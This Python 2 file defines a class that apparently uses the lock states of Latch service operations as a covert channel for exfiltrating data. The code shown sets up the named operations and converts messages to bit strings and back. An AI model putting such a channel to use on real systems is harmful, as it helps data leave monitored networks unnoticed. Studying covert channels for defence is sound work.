# -*- coding: utf-8 -*-
import latch_interface
import time
import binascii
import collections

class LatchExfiltration(object):

    latches = ['1', '2', '3', '4', '5', '6', '7', '8', 'control', 'reader', 'end']

    def __init__(self, account_id=None):
        self.latch = latch_interface.LatchInterface(account_id)
        self.dict_converted = self.start_exfiltration()

    # Initiation
    def clean_exfiltration(self):
        """
        Delete all operations and re-create them in order to have a clean start
        """
        operations = self.latch.get_operations()
        for key, value in operations.iteritems():
            self.latch.delete_operation(key)
        for latch in self.latches:
            self.latch.create_operation(latch)

    def start_exfiltration(self):
        """Start the process of exfiltration by getting all the operations, 
        checking if they're correct and creating new ones if it's not the case
        
        Returns:
            Dictionary -- Dictionary with the name of the operation as key and its operation id as value
        """
        operations_new = self.latch.get_operations()
        operations_check = [value.get('name', '') for (key, value) in operations_new.iteritems()]
        if collections.Counter(operations_check) != collections.Counter(self.latches): # cambiar a comprobar que sean lo mismo
            self.clean_exfiltration()
            operations_new = self.latch.get_operations()
        dict_converted = self.convert_response(operations_new)
        self.latch.unlock_all(dict_converted)
        return dict_converted

    def convert_response(self, operations):
        """Transform the operations sent by latch with the format used in exfiltration
        
        Arguments:
            operations {Dictionary} -- Operations received from Latch
        
        Returns:
            Dictionary -- Used in the rest of the exfiltration process to get the operations
        """
        dict_sorted = {value.get('name', '') : key for (key, value) in operations.iteritems()}
        return dict_sorted

    def read_string_to_byte(self, message):
        """Transform a string into an array of bits
        
        Arguments:
            message {String} -- Message to exfiltrate
        
        Returns:
            List -- Bit representation of the message
        """
        bits_converted = [format(x, 'b') for x in bytearray(message)]
        bits_fixed = [('0' * (8 - len(byte))) + byte for idx, byte in enumerate(bits_converted)]
        return bits_fixed

    def ascii_to_string(self, ascii):
        """Transform a bit representation of a character into Ascii Character
        
        Arguments:
            ascii {String} -- String representation of bits

        Returns:
            String -- Ascii Character
        """
        value = int(ascii, 2)
        return binascii.unhexlify('%x' % value)